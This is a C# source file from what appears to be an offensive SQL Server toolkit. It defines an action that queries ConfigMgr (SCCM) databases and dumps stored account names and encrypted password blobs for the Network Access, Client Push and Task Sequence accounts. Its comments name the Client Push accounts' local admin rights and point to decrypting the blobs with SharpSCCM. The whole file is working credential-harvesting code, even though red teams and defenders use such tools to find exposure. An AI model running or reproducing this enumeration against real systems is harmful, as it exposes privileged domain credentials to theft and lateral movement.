// MSSQLand/Actions/ConfigMgr/CMAccounts.cs

using MSSQLand.Services;
using MSSQLand.Utilities;
using MSSQLand.Utilities.Formatters;
using System;
using System.Data;

namespace MSSQLand.Actions.ConfigMgr
{
    /// <summary>
    /// Enumerate ConfigMgr stored credentials including Network Access Account (NAA), Client Push, and Task Sequence accounts.
    /// Use this to identify encrypted credentials stored in the database that can be decrypted on the site server.
    /// Shows account names, types, site ownership, and encrypted blobs.
    /// NAA provides network access for clients without domain credentials.
    /// Client Push accounts have local admin rights on target machines.
    /// Requires access to site server for decryption - use with SharpSCCM or similar tools.
    /// </summary>
    internal class CMAccounts : BaseAction
    {
        public override object Execute(DatabaseContext databaseContext)
        {
            Logger.TaskNested("Enumerating ConfigMgr stored credentials");

            CMService sccmService = new(databaseContext.QueryService, databaseContext.Server);

            var databases = sccmService.GetSccmDatabases();

            if (databases.Count == 0)
            {
                Logger.Warning("No ConfigMgr databases found");
                return null;
            }

            foreach (string db in databases)
            {
                string siteCode = CMService.GetSiteCode(db);

                Logger.NewLine();
                Logger.Info($"ConfigMgr database: {db} (Site Code: {siteCode})");

                string query = $@"
SELECT
    ua.ID,
    ua.SiteNumber,
    ua.UserName,
    CONVERT(VARCHAR(MAX), ua.Password, 1) AS Password,
    ua.Availability,
    sd.SiteCode,
    sd.SiteServerName
FROM [{db}].dbo.SC_UserAccount ua
LEFT JOIN [{db}].dbo.SC_SiteDefinition sd ON ua.SiteNumber = sd.SiteNumber
ORDER BY ua.UserName;
";

                DataTable result = databaseContext.QueryService.ExecuteTable(query);

                if (result.Rows.Count == 0)
                {
                    Logger.Warning("No stored credentials found");
                    continue;
                }

                Logger.Success($"Found {result.Rows.Count} stored credential(s)");
                Console.WriteLine(OutputFormatter.ConvertDataTable(result));
            }

            Logger.Success("Credential enumeration completed");
            return null;
        }
    }
}
